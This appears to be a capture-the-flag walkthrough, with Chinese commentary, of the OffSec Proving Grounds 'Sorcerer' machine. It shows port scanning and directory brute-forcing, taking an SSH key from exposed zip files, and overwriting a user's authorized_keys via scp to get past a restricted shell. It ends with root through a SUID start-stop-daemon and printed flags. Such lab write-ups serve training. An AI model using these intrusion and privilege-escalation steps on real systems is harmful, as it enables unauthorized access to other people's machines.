###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Sorcerer
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.182.100 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.182.100:22
Open 192.168.182.100:80
Open 192.168.182.100:2049
Open 192.168.182.100:111
Open 192.168.182.100:7742
Open 192.168.182.100:33603
Open 192.168.182.100:41637
Open 192.168.182.100:42193
Open 192.168.182.100:59253

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http     syn-ack nginx
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
7742/tcp  open  http     syn-ack nginx
|_http-title: SORCERER
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
33603/tcp open  mountd   syn-ack 1-3 (RPC #100005)
41637/tcp open  mountd   syn-ack 1-3 (RPC #100005)
42193/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
59253/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`buster`
```
┌──(kali㉿kali)-[~/pgplay]
└─$ gobuster dir -u http://192.168.192.100:7742 -w /home/kali/SecLists/Discovery/Web-Content/common.txt

===============================================================
/default              (Status: 301) [Size: 178] [--> http://192.168.192.100:7742/default/]
/index.html           (Status: 200) [Size: 1219]
/zipfiles             (Status: 301) [Size: 178] [--> http://192.168.192.100:7742/zipfiles/]
Progress: 4727 / 4727 (100.00%)
```

下載zip檔案中，max的`/home/.ssh`裡面有`id_rsa`檔，試試直接ssh發現不行，發現裡面有跟你說可以使用scp
```
┌──(kali㉿kali)-[~/pgplay/Sorcerer]
└─$ ssh -i id_rsa max@192.168.192.100
The authenticity of host '192.168.192.100 (192.168.192.100)' can't be established.
ED25519 key fingerprint is SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N+4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.192.100' (ED25519) to the list of known hosts.
PTY allocation request failed on channel 0
ACCESS DENIED.
usage: scp [-346BCpqrv] [-c cipher] [-F ssh_config] [-i identity_file]
           [-l limit] [-o ssh_option] [-P port] [-S program] source ... target
Connection to 192.168.192.100 closed.
```

把max的`authorized_keys`改成自己kali的`id_rsa.pub`，用scp方式送上去，就可以直接ssh
```
┌──(kali㉿kali)-[~/pgplay/Sorcerer]
└─$ cat authorized_keys                                                   
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCA8oM4q2WJzeNfxiJ62mSdDrzHaqcNuRV4I39BTN2/2xP7cvRxBJBf7hb2NaB+x/3Ac5g8EhjUgyqnqhENKXl5EKy2YzuTVXl4tZUSaYI8QQ01WvnyLVRK6XqRodWgn/t7y1AC0oxD+QHgO5YbvPSISfbqiaCM+dyA+Qb/zVaSdTFvUkIk8mHDrBLKyvNseW1WpiLbPqZb95uGEVUkn5d3Wasizd+XKoEKs8GYTWrJ9v1zerlGSYXoBhFty1ZWNszFUvaUNqKfyPzCp306i4N8r2VLYW1gLo+TlTi1FJTADxHZbk/YZ/NOWH60O9eGMN6+MxhEgG002fI3ItqNDCQxhW5CtFi1KKvBn7cSxnef2Pl+ZRQAs6ZBGFeOBHmbzN+/gwK21Q+EURYJabWgBjwp+t2x3nu5bOny+1QAmgf1E5vg6hyZL5vCfD15aHIpVWwpC0iXvAQPncEIlMUWhV5Fb80xdVW0TzbPDlDlweOuiJGMXXTxclY91zxsyqPE/0= kali@kali

┌──(kali㉿kali)-[~/pgplay/Sorcerer]
└─$ scp -i id_rsa -O authorized_keys max@192.168.192.100:/home/max/.ssh/authorized_keys
authorized_keys                                                                                 100%  563     2.5KB/s   00:00

┌──(kali㉿kali)-[~/pgplay/Sorcerer]
└─$ ssh max@192.168.192.100 
```

查看`binaries`
```
max@sorcerer:/tmp$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/mount.nfs
/usr/sbin/start-stop-daemon
...
```

查看[GTFOBins](https://gtfobins.github.io/gtfobins/start-stop-daemon/#suid)照做得root，在/root得proof.txt，`/home/dennis`得local.txt
```
max@sorcerer:/tmp$ install -m =xs /usr/sbin/start-stop-daemon .
max@sorcerer:/tmp$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
# whoami
root

# cd /root
# ls
proof.txt
# cat proof.txt
33cc4d2b3ab3b331bdd983314737c3fe

max@sorcerer:/home/dennis$ cat local.txt
db059695dc044dbc63b1da43d2e47354
```
